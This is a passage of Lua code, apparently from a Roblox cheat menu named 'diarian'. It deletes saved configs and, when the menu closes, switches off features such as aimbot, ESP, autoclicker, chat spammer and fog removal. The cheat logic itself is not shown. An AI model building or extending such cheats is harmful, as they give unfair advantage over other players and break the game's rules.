        local name = (selectedConfig ~= "" and selectedConfig) or (configName ~= "" and configName)
        if name and name ~= "" and name ~= "--- no configs ---" then
            local path = Library.ConfigFolder .. "/" .. name .. ".json"
            if isfile and delfile and isfile(path) then
                delfile(path)
                selectedConfig = ""
                Library:Notification({ Name = "Config", Description = "Deleted: " .. name, Icon = "trash", Duration = 2 })
                ConfigDropdown:Refresh(GetConfigs())
            end
        end
    end
})

ConfigListSection:Button({
    Name     = "Refresh List",
    Callback = function()
        ConfigDropdown:Refresh(GetConfigs())
    end
})

Library.Holder.Instance.Destroying:Connect(function()
    pcall(function() KbGui:Destroy() end)

    if F then
        for k, v in pairs(F) do F[k] = false end
    end

    local aim = getAimCfg()
    if aim then aim.enabled = false end

    local spam = getOutspammer()
    if spam and type(spam) == "table" then spam.Enabled = false end

    local click = getAutoclicker()
    if click and type(click) == "table" then click.NormalEnabled = false end

    local esp = getESPConfig()
    if esp then esp.enabled = false end

    local anti = getAntiAnnoy()
    if anti then anti.SetEnabled(false) end

    local comp = getCompell()
    if comp then comp.SetEnabled(false) end

    local fps = getFPS()
    if fps then fps.SetEnabled(false) end

    local eff = getEffects()
    if eff then
        pcall(function()
            eff.SetNoFog(false)
            eff.SetNoShadows(false)
            eff.SetFieldOfView(90)
        end)
    end
end)

Library:Notification({
    Name        = "diarian loaded",
    Description = "Press K to toggle the menu.",
    Icon        = "check",
    Duration    = 6
})
